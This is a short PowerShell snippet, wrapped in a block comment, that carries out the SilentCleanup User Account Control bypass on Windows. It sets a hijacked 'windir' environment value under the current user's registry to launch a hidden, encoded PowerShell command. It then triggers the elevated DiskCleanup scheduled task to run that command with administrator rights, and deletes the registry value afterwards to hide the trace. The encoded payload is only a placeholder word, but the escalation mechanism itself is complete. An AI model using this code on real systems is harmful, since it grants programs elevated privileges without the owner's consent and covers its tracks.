<#
$key = "HKCU:\Environment"
$payload = $PSHOME + '\' + 'powershell.exe -NoP -NonI -w Hidden -enc dGVzdA=='
if ($true) {
    New-Item $key -Force |
        New-ItemProperty -Name 'windir' -Value $payload -PropertyType string -Force | Out-Null
}
Start-Process schtasks.exe -ArgumentList '/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I'
Remove-ItemProperty -Path $key -Name windir
#>
